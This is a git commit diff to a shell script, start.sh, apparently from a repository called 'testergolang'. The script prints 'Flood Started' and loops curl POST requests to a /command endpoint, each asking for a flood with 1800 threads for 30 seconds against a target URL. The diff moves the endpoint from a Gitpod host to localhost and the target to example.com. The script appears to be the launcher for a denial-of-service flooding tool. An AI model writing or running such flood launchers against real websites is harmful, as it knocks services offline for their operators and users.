155fc520d37d6c2c47a5a40bdfd63c3755a1f1be
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2024-11-27 18:12:06 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -6,7 +6,7 @@ do
     echo Flood Started
     for ((i=1;i<=$process;i++))
     do
-        curl -X POST -d "url=https://website/&threads=1800&timer=30" https://8080-jdpst224-testergolang-ya977y75535.ws-us116.gitpod.io/command
+        curl -X POST -d "url=https://example.com/&threads=1800&timer=30" http://localhost:8080/command
         sleep 0.1
     done
     sleep 15
